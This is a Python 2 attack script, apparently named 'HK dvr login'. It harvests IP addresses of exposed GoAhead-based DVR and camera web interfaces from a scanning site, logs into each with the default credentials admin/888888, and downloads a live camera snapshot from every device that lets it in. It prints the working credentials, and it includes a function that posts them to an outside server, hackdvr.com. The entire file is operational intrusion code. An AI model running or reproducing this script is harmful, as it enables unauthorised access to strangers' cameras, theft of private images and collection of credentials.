#!/usr/bin/env python
# coding=utf-8

import threading
import requests
import random
import Queue
import json
import sys
import re

reload(sys)
sys.setdefaultencoding('utf8')


def MyThread(iplist):

    threads = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[1])):
        threads.append(tThread(queue))

    for t in threads:
        t.start()
    for t in threads:
        t.join()


class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):

        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue


def getinfo(host):

    username = "admin"
    password = '888888'
    timeout = 10

    try:
        result = requests.get(url='http://' + host + '/index.htm', auth=(username, password), timeout=timeout).text
        imgsrc = 'http://' + host + '/snapshot.cgi?user='+ username +'&pwd='+password
        # localPath = sys.path[0] + '/cut/' + host.replace(':', '-') + '.jpg'
        localPath = sys.path[0] + '/cut/' + str(random.uniform(0, 1)) + '.jpg'

        if 'pda.htm' in result:
            try:
                img = requests.get(imgsrc, stream=True)
                with open(localPath, 'wb') as f:
                    for chunk in img.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
                            f.flush()
                    f.close()
            except Exception, e:
                print e

            aimData = {
                "host": host,
                "username": username,
                "password": password
            }

            print str(aimData)
            # saveToServer(aimData)
    except:
        pass

def saveToServer(aimData):
    try:
        result = json.loads(requests.post(url='http://t.hackdvr.com/save_iwatch.php', data=aimData, timeout=15).content)
        if result['code'] == 0:
            print "Save Success!"
        else:
            print "Save Failed!"

    except Exception, e:
        saveToServer(aimData)


if __name__ == '__main__':
    print '\n*************** HK dvr login ****************'
    print '              Author 92ez.com'
    print '       You should know what U R doing!'
    print '*********************************************\n'

    print '[*] Request to header.telnetscan.org ...'
    content1 = requests.get('http://header.telnetscan.org/search.php?s=GoAhead-Webs&k=Document Error: Unauthorized').content

    content = content1
    iplist = re.findall(r'href="http://(.+?)">',content)

    print '[*] Total '+str(len(iplist))+" items..."
    print '[*] Running...\n'

    try:
        MyThread(iplist)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()